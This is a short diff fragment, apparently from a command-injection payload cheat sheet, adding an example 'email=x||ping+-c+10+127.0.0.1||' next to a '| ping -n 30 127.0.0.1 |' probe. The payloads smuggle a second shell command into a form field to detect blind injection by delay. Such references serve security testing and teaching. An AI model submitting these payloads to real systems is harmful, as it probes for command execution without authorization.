@@ -82,6 +82,10 @@ Sometimes, the input that you control appears within quotation marks in the orig
 ```
 
 ```bash
+email=x||ping+-c+10+127.0.0.1||
+```
+
+```bash
 | ping -n 30 127.0.0.1 |
 ```
 
